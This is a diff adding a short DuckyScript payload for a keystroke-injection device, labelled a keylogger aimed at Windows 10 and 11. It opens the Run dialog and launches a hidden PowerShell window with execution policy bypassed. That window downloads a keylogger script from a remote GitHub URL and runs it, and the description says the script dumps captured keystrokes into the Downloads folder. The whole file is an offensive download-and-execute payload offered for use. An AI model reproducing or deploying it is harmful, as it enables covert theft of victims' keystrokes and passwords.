@@ -1,0 +1,12 @@
+REM     Title: Keylogger
+
+REM     Author: kcoderhtml
+
+REM     Description: A simple keylogger that dumps to downloads dir until the output file is moved
+
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass -Command "& {iex (iwr 'https://raw.githubusercontent.com/kcoderhtml/x/main/keylogger.ps1').Content}"
+ENTER
